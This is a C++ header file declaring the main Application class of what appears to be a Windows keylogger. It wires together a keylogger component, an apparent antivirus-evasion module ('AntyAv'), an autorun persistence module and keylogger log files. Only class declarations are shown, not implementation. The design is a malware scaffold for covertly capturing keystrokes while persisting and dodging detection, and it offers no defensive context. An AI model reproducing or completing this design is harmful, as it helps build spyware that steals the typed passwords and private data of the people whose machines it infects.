#ifndef APPLICATION_H
#define APPLICATION_H

#include <iostream>
#include <windows.h>
#include <cstring>
#include <fstream>

#include "config.h"
#include "keylogger.h"
#include "timelog.h"
#include "log.h"
#include "antyav.h"
#include "autorun.h"
#include "newwinapi.h"

using namespace std;

class Application
{
public:
    Application(string fileName);
    void start();
    void stop();
    void running();
    string getKeyloggerFileName();
private:
    bool isMultiRun();
    Config *config;
    LPCTSTR StringToLPCTSTR(string value);
    Keylogger *keylogger;
    TimeLog *time;
    Log *log;
    AntyAv *antyAV;
    string keyloggerFileName;
    Autorun *autorun;
    newWinApi *newWinApix;
};

#endif // APPLICATION_H
